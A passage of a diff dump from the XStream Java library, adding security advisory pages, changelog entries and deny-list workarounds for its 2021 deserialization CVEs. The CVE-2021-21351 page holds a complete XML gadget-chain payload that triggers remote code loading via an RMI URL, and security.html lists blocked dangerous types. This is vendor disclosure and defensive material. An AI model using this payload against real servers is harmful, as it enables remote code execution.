          "148:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "150:     <h2 id=\"impact\">Impact</h2>",
          "152:  <p>The vulnerability may allow a remote attacker to execute arbitrary code only by manipulating the processed",
          "153:  input stream.</p>",
          "155:     <h2 id=\"workarounds\">Workarounds</h2>",
          "157:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "159:     <h2 id=\"credits\">Credits</h2>",
          "161:     <p>The vulnerability was discovered and reported by threedr3am.</p>",
          "163:    </body>",
          "164:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-21351.html||xstream-distribution/src/content/CVE-2021-21351.html": [
          "File: xstream-distribution/src/content/CVE-2021-21351.html -> xstream-distribution/src/content/CVE-2021-21351.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 27. February 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-21351</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-21351: XStream is vulnerable to an Arbitrary Code Execution attack.</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:  <p>All versions until and including version 1.4.15 are affected, if using the version out of the box. No user is",
          "24:  affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security",
          "25:  framework</a> with a whitelist limited to the minimal required types.</p>",
          "27:     <h2 id=\"description\">Description</h2>",
          "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "30:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "31:     input stream and replace or inject objects, that result in execution of arbitrary code loaded from a remote server.</p>",
          "33:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "35:  <p>Create a simple TreeSet and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "36:  unmarshal it again with XStream:</p>",
          "37: <div class=\"Source XML\"><pre>&lt;sorted-set&gt;",
          "38:   &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "39:     &lt;type&gt;ysomap&lt;/type&gt;",
          "40:     &lt;value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'&gt;",
          "41:       &lt;m__DTMXRTreeFrag&gt;",
          "42:         &lt;m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'&gt;",
          "43:           &lt;m__size&gt;-10086&lt;/m__size&gt;",
          "44:           &lt;m__mgrDefault&gt;",
          "45:             &lt;__overrideDefaultParser&gt;false&lt;/__overrideDefaultParser&gt;",
          "46:             &lt;m__incremental&gt;false&lt;/m__incremental&gt;",
          "47:             &lt;m__source__location&gt;false&lt;/m__source__location&gt;",
          "48:             &lt;m__dtms&gt;",
          "49:               &lt;null/&gt;",
          "50:             &lt;/m__dtms&gt;",
          "51:             &lt;m__defaultHandler/&gt;",
          "52:           &lt;/m__mgrDefault&gt;",
          "53:           &lt;m__shouldStripWS&gt;false&lt;/m__shouldStripWS&gt;",
          "54:           &lt;m__indexing&gt;false&lt;/m__indexing&gt;",
          "55:           &lt;m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'&gt;",
          "56:             &lt;fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'&gt;",
          "57:               &lt;javax.sql.rowset.BaseRowSet&gt;",
          "58:                 &lt;default&gt;",
          "59:                   &lt;concurrency&gt;1008&lt;/concurrency&gt;",
          "60:                   &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;",
          "61:                   &lt;fetchDir&gt;1000&lt;/fetchDir&gt;",
          "62:                   &lt;fetchSize&gt;0&lt;/fetchSize&gt;",
          "63:                   &lt;isolation&gt;2&lt;/isolation&gt;",
          "64:                   &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;",
          "65:                   &lt;maxRows&gt;0&lt;/maxRows&gt;",
          "66:                   &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;",
          "67:                   &lt;readOnly&gt;true&lt;/readOnly&gt;",
          "68:                   &lt;rowSetType&gt;1004&lt;/rowSetType&gt;",
          "69:                   &lt;showDeleted&gt;false&lt;/showDeleted&gt;",
          "70:                   &lt;dataSource&gt;rmi://localhost:15000/CallRemoteMethod&lt;/dataSource&gt;",
          "71:                   &lt;listeners/&gt;",
          "72:                   &lt;params/&gt;",
          "73:                 &lt;/default&gt;",
          "74:               &lt;/javax.sql.rowset.BaseRowSet&gt;",
          "75:               &lt;com.sun.rowset.JdbcRowSetImpl&gt;",
          "76:                 &lt;default/&gt;",
          "77:               &lt;/com.sun.rowset.JdbcRowSetImpl&gt;",
          "78:             &lt;/fPullParserConfig&gt;",
          "79:             &lt;fConfigSetInput&gt;",
          "80:               &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;",
          "81:               &lt;name&gt;setAutoCommit&lt;/name&gt;",
          "82:               &lt;parameter-types&gt;",
          "83:                 &lt;class&gt;boolean&lt;/class&gt;",
          "84:               &lt;/parameter-types&gt;",
          "85:             &lt;/fConfigSetInput&gt;",
          "86:             &lt;fConfigParse reference='../fConfigSetInput'/&gt;",
          "87:             &lt;fParseInProgress&gt;false&lt;/fParseInProgress&gt;",
          "88:           &lt;/m__incrementalSAXSource&gt;",
          "89:           &lt;m__walker&gt;",
          "90:             &lt;nextIsRaw&gt;false&lt;/nextIsRaw&gt;",
          "91:           &lt;/m__walker&gt;",
          "92:           &lt;m__endDocumentOccured&gt;false&lt;/m__endDocumentOccured&gt;",
          "93:           &lt;m__idAttributes/&gt;",
          "94:           &lt;m__textPendingStart&gt;-1&lt;/m__textPendingStart&gt;",
          "95:           &lt;m__useSourceLocationProperty&gt;false&lt;/m__useSourceLocationProperty&gt;",
          "96:           &lt;m__pastFirstElement&gt;false&lt;/m__pastFirstElement&gt;",
          "97:         &lt;/m__dtm&gt;",
          "98:         &lt;m__dtmIdentity&gt;1&lt;/m__dtmIdentity&gt;",
          "99:       &lt;/m__DTMXRTreeFrag&gt;",
          "100:       &lt;m__dtmRoot&gt;1&lt;/m__dtmRoot&gt;",
          "101:       &lt;m__allowRelease&gt;false&lt;/m__allowRelease&gt;",
          "102:     &lt;/value&gt;",
          "103:   &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "104:   &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "105:     &lt;type&gt;ysomap&lt;/type&gt;",
          "106:     &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt;",
          "107:       &lt;m__obj class='string'&gt;test&lt;/m__obj&gt;",
          "108:     &lt;/value&gt;",
          "109:   &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "110: &lt;/sorted-set&gt;",
          "111: </pre></div>",
          "112: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "113: xstream.fromXML(xml);",
          "114: </pre></div>",
          "116:     <p>Depending on the JDK, the code from the remote server is executed as soon as the XML gets unmarshalled or when",
          "117:     another element is added to the set.</p>",
          "119:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "121:     <h2 id=\"impact\">Impact</h2>",
          "123:  <p>The vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by",
          "124:  manipulating the processed input stream.</p>",
          "126:     <h2 id=\"workarounds\">Workarounds</h2>",
          "128:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "130:     <h2 id=\"credits\">Credits</h2>",
          "132:     <p>wh1t3p1g G5-RD6@IIE found and reported the issue to XStream and provided the required information to reproduce it.</p>",
          "134:    </body>",
          "135:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html": [
          "File: xstream-distribution/src/content/changes.html -> xstream-distribution/src/content/changes.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "110:  <p>Not yet released.</p>",
          "112:  <h2>Major changes</h2>",
          "114:  <ul>",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "112:  <p class=\"highlight\">This maintenance release addresses following security vulnerabilities, when unmarshalling",
          "113:  with an XStream instances using an uninitialized security framework.</p>",
          "115:  <ul>",
          "116:   <li><a href=\"CVE-2021-21341.html\">CVE-2021-21341</a></li>",
          "117:   <li><a href=\"CVE-2021-21342.html\">CVE-2021-21342</a></li>",
          "118:   <li><a href=\"CVE-2021-21343.html\">CVE-2021-21343</a></li>",
          "119:   <li><a href=\"CVE-2021-21344.html\">CVE-2021-21344</a></li>",
          "120:   <li><a href=\"CVE-2021-21345.html\">CVE-2021-21345</a></li>",
          "121:   <li><a href=\"CVE-2021-21346.html\">CVE-2021-21346</a></li>",
          "122:   <li><a href=\"CVE-2021-21347.html\">CVE-2021-21347</a></li>",
          "123:   <li><a href=\"CVE-2021-21348.html\">CVE-2021-21348</a></li>",
          "124:   <li><a href=\"CVE-2021-21349.html\">CVE-2021-21349</a></li>",
          "125:   <li><a href=\"CVE-2021-21350.html\">CVE-2021-21350</a></li>",
          "126:   <li><a href=\"CVE-2021-21351.html\">CVE-2021-21351</a></li>",
          "127:  </ul>",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "122:   <li>GHI:#237: Fix optimization in XmlFriendlyNameCoder.</li>",
          "123:  </ul>",
          "125:  <h2>Dependencies</h2>",
          "127:  <p>The default parser of XStream has changed from the Xpp3Parser in artifact xpp3:xpp3_min to MXParser, a fork of",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "142:  <h2>Stream compatibility</h2>",
          "144:  <ul>",
          "145:   <li>The type hierarchies for java.io.InputStream, java.nio.channels.Channel, javax.activation.DataSource and",
          "146:   javax.sql.rowsel.BaseRowSet are now blacklisted as well as the individual types",
          "147:   com.sun.corba.se.impl.activation.ServerTableEntry,",
          "148:   com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator,",
          "149:   sun.awt.datatransfer.DataTransferer$IndexOrderComparator, and sun.swing.SwingLazyValue.  Additionally the",
          "150:   internal type Accessor$GetterSetterReflection of JAXB, the internal types MethodGetter$PrivilegedGetter and",
          "151:   ServiceFinder$ServiceNameIterator of JAX-WS, all inner classes of javafx.collections.ObservableList and an",
          "152:   internal ClassLoader used in a private BCEL copy are now part of the default blacklist and the deserialization",
          "153:   of XML containing one of the two types will fail.  You will have to enable these types by explicit",
          "154:   configuration, if you need them.</li>",
          "155:  </ul>",
          "",
          "---------------",
          "--- Hunk 3 ---",
          "[Context before]",
          "136:  <p class=\"highlight\">This maintenance release addresses the security vulnerabilities",
          "137:  <a href=\"CVE-2020-26258.html\">CVE-2020-26258</a> and <a href=\"CVE-2020-26259.html\">CVE-2020-26259</a>, when",
          "140:  <h2>Minor changes</h2>",
          "",
          "[Removed Lines]",
          "138:  unmarshalling for XStream instances with uninitialized security framework.</p>",
          "",
          "[Added Lines]",
          "170:  unmarshalling with XStream instances using an uninitialized security framework.</p>",
          "",
          "---------------",
          "--- Hunk 4 ---",
          "[Context before]",
          "175:  <p class=\"highlight\">This maintenance release addresses the security vulnerability",
          "176:  <a href=\"CVE-2020-26217.html\">CVE-2020-26217</a>, reported originally as CVE-2017-9805 for Struts' XStream Plugin,",
          "179:  <h2>Stream compatibility</h2>",
          "",
          "[Removed Lines]",
          "177:  an arbitrary execution of commands when unmarshalling for XStream instances with uninitialized security framework.</p>",
          "",
          "[Added Lines]",
          "209:  an arbitrary execution of commands when unmarshalling with XStream instances using an uninitialized security",
          "210:  framework.</p>",
          "",
          "---------------",
          "--- Hunk 5 ---",
          "[Context before]",
          "225:  <p>Released October 23, 2018.</p>",
          "227:  <p class=\"highlight\">This maintenance release addresses again the security vulnerability <a href=\"CVE-2013-7285.html\">",
          "229:      uninitialized security framework. Only 1.4.10 uninitialized security framework was affected.</p>",
          "231:  <h2>Minor changes</h2>",
          "",
          "[Removed Lines]",
          "228:      CVE-2013-7285</a>, an arbitrary execution of commands when unmarshalling for XStream instances with",
          "",
          "[Added Lines]",
          "261:      CVE-2013-7285</a>, an arbitrary execution of commands when unmarshalling with XStream instances using an",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html": [
          "File: xstream-distribution/src/content/security.html -> xstream-distribution/src/content/security.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "1: <html>",
          "2: <!--",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "",
          "[Removed Lines]",
          "3:  Copyright (C) 2014, 2015, 2017, 2019, 2020 XStream committers.",
          "",
          "[Added Lines]",
          "3:  Copyright (C) 2014, 2015, 2017, 2019, 2020, 2021 XStream committers.",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "30:  <p>The provided XML data is used by XStream to unmarshal Java objects.  This data can be manipulated by injecting",
          "31:  the XML representation of other objects, that were not present at marshalling time.  An attacker could take",
          "32:  advantage of this to access private data, delete local files, execute arbitrary code or shell commands in the",
          "44:     <h2 id=\"external\">External Security</h2>",
          "",
          "[Removed Lines]",
          "33:  context of the server running the XStream process.  Concrete cases are described in",
          "34:  <a href=\"CVE-2013-7285.html\">CVE-2013-7285</a>, <a href=\"CVE-2020-26217.html\">CVE-2020-26217</a>,",
          "35:  <a href=\"CVE-2020-26258.html\">CVE-2020-26258</a>, and <a href=\"CVE-2020-26259.html\">CVE-2020-26259</a>.</p>",
          "37:  <p>Note that the XML data can be manipulated on different levels.  For example, manipulating values on existing",
          "38:  objects (such as a price value), or breaking the format and causing the XML parser to fail.  The latter case will",
          "39:  raise an\u00a0exception, but the former case must be handled by validity checks in any application which processes",
          "40:  user-supplied XML.  A worst case scenario is the injection of arbitrary code or shell commands, as noted above.",
          "41:  Even worse, <a href=\"CVE-2017-7957.html\">CVE-2017-7957</a> describes a case to crash the Java Virtual Machine",
          "42:  causing a Denial of Service.</p>",
          "",
          "[Added Lines]",
          "33:  context of the server running the XStream process or cause a denial of service by crashing the application or",
          "34:  manage to enter an endless loop consuming 100% of CPU cycles.</p>",
          "36:  <p>Note, that the XML data can be manipulated on different levels.  For example, manipulating values on existing",
          "37:   objects (such as a price value), accessing private data, or breaking the format and causing the XML parser to fail.",
          "38:   The latter case will raise an\u00a0exception, but the former case must be handled by validity checks in any application",
          "39:   which processes user-supplied XML.</p>",
          "41:     <h2 id=\"CVEs\">Documented Vulnerabilities</h2>",
          "43:     <p>Over the years, several of these attacks have been reported and documented in the Common Vulnerability and",
          "44:     Exposure (CVE) system managed by the <a href=\"http://www.mitre.org/\">Mitre Corporation</a>. Following a list of the",
          "45:     reported vulnerabilities:</p>",
          "47:     <table summary=\"Table of reported vulnerabilities daocumented as CVE\">",
          "48:       <tr>",
          "49:         <th>CVE</th>",
          "50:         <th>Description</th>",
          "51:       </tr>",
          "52:       <tr>",
          "53:         <th>2021</th>",
          "54:         <td></td>",
          "55:       </tr>",
          "56:       <tr>",
          "57:         <th><a href=\"CVE-2021-21341.html\">CVE-2021-21341</a></th>",
          "58:         <td>XStream can cause a Denial of Service.</td>",
          "59:       </tr>",
          "60:       <tr>",
          "61:         <th><a href=\"CVE-2021-21342.html\">CVE-2021-21342</a></th>",
          "62:         <td>A Server-Side Forgery Request can be activated unmarshalling with XStream to access data streams from an",
          "63:         arbitrary URL referencing a resource in an intranet or the local host.</td>",
          "64:       </tr>",
          "65:       <tr>",
          "66:         <th><a href=\"CVE-2021-21343.html\">CVE-2021-21343</a></th>",
          "67:         <td>XStream is vulnerable to an Arbitrary File Deletion on the local host when unmarshalling as long as the",
          "68:         executing process has sufficient rights.</td>",
          "69:       </tr>",
          "70:       <tr>",
          "71:         <th><a href=\"CVE-2021-21344.html\">CVE-2021-21344</a></th>",
          "72:         <td>XStream is vulnerable to an Arbitrary Code Execution attack.</td>",
          "73:       </tr>",
          "74:       <tr>",
          "75:         <th><a href=\"CVE-2021-21345.html\">CVE-2021-21345</a></th>",
          "76:         <td>XStream is vulnerable to a Remote Command Execution attack.</td>",
          "77:       </tr>",
          "78:       <tr>",
          "79:         <th><a href=\"CVE-2021-21346.html\">CVE-2021-21346</a></th>",
          "80:         <td>XStream is vulnerable to an Arbitrary Code Execution attack.</td>",
          "81:       </tr>",
          "82:       <tr>",
          "83:         <th><a href=\"CVE-2021-21347.html\">CVE-2021-21347</a></th>",
          "84:         <td>XStream is vulnerable to an Arbitrary Code Execution attack.</td>",
          "85:       </tr>",
          "86:       <tr>",
          "87:         <th><a href=\"CVE-2021-21348.html\">CVE-2021-21348</a></th>",
          "88:         <td>XStream is vulnerable to an attack using Regular Expression for a Denial of Service (ReDos).</td>",
          "89:       </tr>",
          "90:       <tr>",
          "91:         <th><a href=\"CVE-2021-21349.html\">CVE-2021-21349</a></th>",
          "92:         <td>A Server-Side Forgery Request can be activated unmarshalling with XStream to access data streams from an",
          "93:         arbitrary URL referencing a resource in an intranet or the local host.</td>",
          "94:       </tr>",
          "95:       <tr>",
          "96:         <th><a href=\"CVE-2021-21350.html\">CVE-2021-21350</a></th>",
          "97:         <td>XStream is vulnerable to an Arbitrary Code Execution attack.</td>",
          "98:       </tr>",
          "99:       <tr>",
          "100:         <th><a href=\"CVE-2021-21351.html\">CVE-2021-21351</a></th>",
          "101:         <td>XStream is vulnerable to an Arbitrary Code Execution attack.</td>",
          "102:       </tr>",
          "103:       <tr>",
          "104:         <th>2020</th>",
          "105:         <td></td>",
          "106:       </tr>",
          "107:       <tr>",
          "108:         <th><a href=\"CVE-2020-26217.html\">CVE-2020-26217</a></th>",
          "109:         <td>XStream can be used for Remote Code Execution.</td>",
          "110:       </tr>",
          "111:       <tr>",
          "112:         <th><a href=\"CVE-2020-26258.html\">CVE-2020-26258</a></th>",
          "113:         <td>A Server-Side Forgery Request can be activated unmarshalling with XStream to access data streams from an",
          "114:         arbitrary URL referencing a resource in an intranet or the local host.</td>",
          "115:       </tr>",
          "116:       <tr>",
          "117:         <th><a href=\"CVE-2020-26259.html\">CVE-2020-26259</a></th>",
          "118:         <td>XStream is vulnerable to an Arbitrary File Deletion on the local host when unmarshalling as long as the",
          "119:         executing process has sufficient rights.</td>",
          "120:       </tr>",
          "121:       <tr>",
          "122:         <th>2017</th>",
          "123:         <td></td>",
          "124:       </tr>",
          "125:       <tr>",
          "126:         <th><a href=\"CVE-2017-7957.html\">CVE-2017-7957</a></th>",
          "127:         <td>XStream can cause a Denial of Service when unmarshalling void.</td>",
          "128:       </tr>",
          "129:       <tr>",
          "130:         <th>2016</th>",
          "131:         <td></td>",
          "132:       </tr>",
          "133:       <tr>",
          "134:         <th><a href=\"CVE-2016-3674.html\">CVE-2016-3674</a></th>",
          "135:         <td>XML External Entity (XXE) Vulnerability in XStream.</td>",
          "136:       </tr>",
          "137:       <tr>",
          "138:         <th>2013</th>",
          "139:         <td></td>",
          "140:       </tr>",
          "141:       <tr>",
          "142:         <th><a href=\"CVE-2013-7285.html\">CVE-2013-7285</a></th>",
          "143:         <td>XStream can be used for Remote Code Execution.</td>",
          "144:       </tr>",
          "145:     </table>",
          "147:     <p>See <a href=\"#workaround\">workarounds</a> for the different versions covering all the CVEs listed here.</p>",
          "149:  <p class=\"hightlight\">This list will contain only vulnerabilities, that can be created using the Java runtime with",
          "150:  XStream.  Vulnerabilities introduced by using additional 3rd party libraries and classes are beyond XStream's",
          "151:  responsibility.</p>",
          "",
          "---------------",
          "--- Hunk 3 ---",
          "[Context before]",
          "54:     <h2 id=\"implicit\">Implicit Security</h2>",
          "56:  <p>As explained above, it is possible to inject other object instances if an attacker is able to define the data",
          "78:     <h2 id=\"explicit\">Explicit Security</h2>",
          "",
          "[Removed Lines]",
          "57:  used to deserialize the Java objects.  E.g. a known exploit\u00a0can be created with the help of the Java runtime",
          "58:  library using the Java Bean <a href=\"http://docs.oracle.com/javase/7/docs/api/java/beans/EventHandler.html\">EventHandler</a>",
          "59:  as described in <a href=\"CVE-2013-7285.html\">CVE-2013-7285</a>.  This scenario can be used perfectly to",
          "60:  replace/inject a dynamic proxy with such an EventHandler at any location in the XML where its parent expects an",
          "61:  object of such an interface's type or a simple object instance (any list element will suffice).  The usage of a",
          "62:  ProcessBuilder as an embedded element, coupled with the redirection of any call to the ProcessBuilder's",
          "63:  <a href=\"http://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html#start()\">start()</a> method allows",
          "64:  an attacker to call shell commands.  Knowing how to define such an attack is the only prerequisite.</p>",
          "66:   <p>More scenarios have been identified for types that are already delivered with the Java runtime.  Looking at",
          "67:   well-known and commonly used Java libraries libraries such as ASM, CGLIB, or Groovy, the possibility for more",
          "68:   exploits is very high.  A class like InvokerTransformer of Apache Commons Collections has a high potential for",
          "69:   attacks.</p>",
          "71:  <p class=highlight>Note: These vulnerabilities are not even a special problem of XStream.  XML being deserialized",
          "72:  by XStream acts here like a script, and the scenario above can be created with any script that is executed within a",
          "73:   Java runtime (e.g. using its JavaScript interpreter) if someone is able to manipulate it externally.  The key",
          "74:   message for application developers is that deserializing arbitrary user-supplied content is a dangerous proposition",
          "75:  in all cases. The best approach to prevent such an attach is a <a href=\"#example\">whitelist</a>, i.e. the",
          "76:   deserialization mechanism should only allow explicit types.</p>",
          "",
          "[Added Lines]",
          "166:  used to deserialize the Java objects, see the different CVEs.  Knowing how to define such an attack is the only",
          "167:  prerequisite.</p>",
          "169:   <p>All those scenarios were based on types that are delivered with the Java runtime at some version.  Looking at",
          "170:   other well-known and commonly used Java libraries libraries such as ASM, CGLIB, or Groovy, you will have to assume",
          "171:   other scenarios for exploits as well.  A class like InvokerTransformer of Apache Commons Collections has a high",
          "172:   potential for attacks.   By default XStream 1.5 works now with a whitelist.  If you modify the default setup, it",
          "173:   is also your responsibility to protect your clients from such vulnerabilities.</p>",
          "175:  <p>Note: This vulnerability is not even a special problem of XStream.  XML being deserialized by XStream acts here",
          "176:  like a script, and the scenario above can be created with any script that is executed within a Java runtime (e.g.",
          "177:  using its JavaScript interpreter) if someone is able to manipulate it externally.  The key message for application",
          "178:  developers is that deserializing arbitrary user-supplied content is a dangerous proposition in all cases. The best",
          "179:  approach to prevent such an attach is a <a href=\"#example\">whitelist</a>, i.e. the deserialization mechanism should",
          "180:  only allow explicit types. See also the advice for vulnerabilities using",
          "181:  <a href=\"https://docs.oracle.com/javase/10/core/serialization-filtering1.htm\">Java Serialization</a>.</p>",
          "183:  <p class=\"hightlight\">A blacklist for special classes only creates therefore a scenario for a false security,",
          "184:     because no-one can assure, that no other vulnerability is found.  A better approach is the usage of a whitelist",
          "185:     i.e. the allowed class types are setup explicitly. This is the default for XStream 1.5.x (see below).</p>",
          "",
          "---------------",
          "--- Hunk 4 ---",
          "[Context before]",
          "87:  converters for.  Nonetheless, it is still the better approach to maintain an own whitelist for an XStream",
          "88:  instance.  A blacklist scenario should be avoided in general, because it provides a false sense of security.</p>",
          "93:  <p>Separate to the XStream security framework, it has always been possible to overwrite the setupConverter method",
          "94:  of XStream to register only the required converters.</p>",
          "",
          "[Removed Lines]",
          "90:  <p class=highlight>Note: If a type on a whitelist contains itself other members that are handled by XStream, you",
          "91:  will have to add those member's types to the whitelist also.</p>",
          "",
          "[Added Lines]",
          "199:  <p class=highlight>Note:  If a type on a whitelist contains itself other members that are handled by XStream, you",
          "200:  will have to add those member's types to the whitelist also.  There is no automatism for indirect references.</p>",
          "",
          "---------------",
          "--- Hunk 5 ---",
          "[Context before]",
          "269: xstream.allowTypesByWildcard(Blog.class.getPackage().getName()+\".*\");",
          "270: </pre></div>",
          "273:   </body>",
          "274:  </html>",
          "",
          "[Removed Lines]",
          "272:   <p>You may have a further look at XStream's acceptance tests, the security framework is enabled there in general.</p>",
          "",
          "[Added Lines]",
          "382:     <p>You may have a further look at XStream's acceptance tests, the security framework is enabled there in general.</p>",
          "384:     <h2 id=\"workaround\">Workarounds for older XStream versions</h2>",
          "386:     <p>As recommended, use XStream's security framework to implement a whitelist for the allowed types. This is",
          "387:     possible since XStream 1.4.7 and the default since XStream 1.5.0:</p>",
          "388: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "390: </pre></div>",
          "391:     <p>Users of XStream 1.4.14 who insist to use XStream default blacklist - despite that clear recommendation - can",
          "392:     add these lines to XStream's setup code:</p>",
          "393: <div class=\"Source Java\"><pre>xstream.denyTypes(new String[]{ \"sun.awt.datatransfer.DataTransferer$IndexOrderComparator\", \"sun.swing.SwingLazyValue\", \"com.sun.corba.se.impl.activation.ServerTableEntry\", \"com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator\" });",
          "394: xstream.denyTypesByRegExp(new String[]{ \".*\\\\$ServiceNameIterator\", \"javafx\\\\.collections\\\\.ObservableList\\\\$.*\", \".*\\\\.bcel\\\\..*\\\\.util\\\\.ClassLoader\" });",
          "395: xstream.denyTypeHierarchy(java.io.InputStream.class );",
          "396: xstream.denyTypeHierarchy(java.nio.channels.Channel.class );",
          "397: xstream.denyTypeHierarchy(javax.activation.DataSource.class );",
          "398: xstream.denyTypeHierarchy(javax.sql.rowset.BaseRowSet.class );",
          "399: </pre></div>",
          "400:     <p>Users of XStream 1.4.13 should <strong>additionally</strong> add these two lines to the lines from above:</p>",
          "401: <div class=\"Source Java\"><pre>xstream.denyTypes(new String[]{ \"javax.imageio.ImageIO$ContainsFilter\" });",
          "402: xstream.denyTypes(new Class[]{ java.lang.ProcessBuilder.class });",
          "403: </pre></div>",
          "404:     <p>Users of XStream 1.4.12 to 1.4.7 who want to use XStream with a blacklist will have to setup such a list from",
          "405:     scratch:</p>",
          "406: <div class=\"Source Java\"><pre>xstream.denyTypes(new String[]{ \"javax.imageio.ImageIO$ContainsFilter\", \"sun.awt.datatransfer.DataTransferer$IndexOrderComparator\", \"com.sun.corba.se.impl.activation.ServerTableEntry\", \"com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator\" });",
          "407: xstream.denyTypes(new Class[]{ java.lang.ProcessBuilder.class, java.beans.EventHandler.class, java.lang.ProcessBuilder.class, java.lang.Void.class, void.class });",
          "408: xstream.denyTypesByRegExp(new String[]{ \".*\\\\$ServiceNameIterator\", \"javafx\\\\.collections\\\\.ObservableList\\\\$.*\", \".*\\\\.bcel\\\\..*\\\\.util\\\\.ClassLoader\", \".*\\\\$GetterSetterReflection\", \".*\\\\$LazyIterator\", \".*\\\\$PrivilegedGetter\" });",
          "409: xstream.denyTypeHierarchy(java.io.InputStream.class);",
          "410: xstream.denyTypeHierarchy(java.nio.channels.Channel.class);",
          "411: xstream.denyTypeHierarchy(javax.activation.DataSource.class);",
          "412: xstream.denyTypeHierarchy(javax.sql.rowset.BaseRowSet.class);",
          "413: </pre></div>",
          "414:  <p>Users of XStream 1.4.6 or below can register an own converter to prevent the unmarshalling of the currently",
          "415:  know critical types of the Java runtime. It is in fact an updated version of the workaround for CVE-2013-7285:</p>",
          "416: <div class=\"Source Java\"><pre>xstream.registerConverter(new Converter() {",
          "417:   public boolean canConvert(Class type) {",
          "418:     return type != null",
          "419:       &amp;&amp; (type == java.beans.EventHandler.class || type == java.lang.ProcessBuilder.class || type == java.lang.Void.class || void.class",
          "420:         || type.getName().equals(\"javax.imageio.ImageIO$ContainsFilter\") || type.getName().equals(\"sun.awt.datatransfer.DataTransferer$IndexOrderComparator\") || type.getName().equals(\"com.sun.corba.se.impl.activation.ServerTableEntry\") || type.getName().equals(\"com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator\")",
          "421:         || type.getName().matches(\"javafx\\\\.collections\\\\.ObservableList\\\\$.*\") || type.getName().matches(\".*\\\\$ServiceNameIterator\")  || type.getName().matches(\".*\\\\$GetterSetterReflection\") || type.getName().matches(\".*\\\\$LazyIterator\") || type.getName().matches(\".*\\\\.bcel\\\\..*\\\\.util\\\\.ClassLoader\")",
          "422:         || java.io.InputStream.class.isAssignableFrom(type) || java.nio.channels.Channel.isAssignableFrom(type) || javax.activation.DataSource.isAssignableFrom(type) ||javax.sql.rowset.BaseRowSet.isAssignableFrom(type)",
          "423:         || Proxy.isProxy(type));",
          "424:   }",
          "426:   public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {",
          "427:     throw new ConversionException(\"Unsupported type due to security reasons.\");",
          "428:   }",
          "430:   public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) {",
          "431:     throw new ConversionException(\"Unsupported type due to security reasons.\");",
          "432:   }",
          "433: }, XStream.PRIORITY_VERY_HIGH);",
          "434: </pre></div>",
          "",
          "---------------"
        ],
        "xstream/src/test/com/thoughtworks/acceptance/SecurityVulnerabilityTest.java||xstream/src/test/com/thoughtworks/acceptance/SecurityVulnerabilityTest.java": [
          "File: xstream/src/test/com/thoughtworks/acceptance/SecurityVulnerabilityTest.java -> xstream/src/test/com/thoughtworks/acceptance/SecurityVulnerabilityTest.java",
          "--- Hunk 1 ---",
          "[Context before]",
          "11: package com.thoughtworks.acceptance;",
          "13: import java.beans.EventHandler;",
          "14: import java.io.File;",
          "15: import java.io.FileOutputStream;",
          "16: import java.io.IOException;",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "14: import java.io.ByteArrayInputStream;",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "209:             }",
          "210:         }",
          "211:     }",
          "212: }",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
